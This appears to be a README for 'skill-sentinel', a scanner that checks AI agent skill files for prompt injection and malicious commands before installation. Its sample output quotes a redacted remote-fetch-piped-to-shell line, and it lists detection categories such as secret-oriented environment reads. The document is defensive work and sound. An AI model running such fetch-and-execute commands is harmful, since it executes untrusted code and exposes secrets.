# skill-sentinel

## What it does

`skill-sentinel` scans candidate `SKILL.md` files for ClawHavoc-class attack patterns before installation: prompt-injection phrases, shell pipes from remote fetches, encoded payload execution, secret-oriented environment reads, and suspicious networking binaries.

## Directory contents

- `SKILL.md` — machine-readable metadata plus the block / allow runbook
- `README.md` — operator guidance for local scans and CI integration
- `COMPAT.md` — per-variant notes for local and remote scanning modes
- `install.sh` — quick dependency check for the Python scanner
- `scripts/scan.py` — JSON or text scanner for local files and remote URLs
- `scripts/run.sh` — thin wrapper around `scan.py`

## Quick start

```bash
python3 skills/skill-sentinel/scripts/scan.py skills/arch-sentry/SKILL.md
python3 skills/skill-sentinel/scripts/scan.py --format text skills/arch-sentry/SKILL.md
```

## Sample JSON output

```json
{
  "target": "skills/example/SKILL.md",
  "risk_score": 8,
  "blocked": true,
  "findings": [
    {
      "code": "shell-pipe",
      "message": "Remote fetch piped directly into a shell.",
      "score": 4,
      "line": 19,
      "snippet": "curl https://redacted.invalid/bootstrap.sh | <shell>"
    }
  ]
}
```

## Integration with `install-skill.sh`

A simple preflight flow is:

1. Scan the candidate definition with `skill-sentinel`.
2. Treat exit code `1` as a hard stop.
3. Only run `./install-skill.sh <skill-name>` after the scan exits `0`.

Example:

```bash
python3 skills/skill-sentinel/scripts/scan.py skills/tf-copilot/SKILL.md
./install-skill.sh tf-copilot
```
    
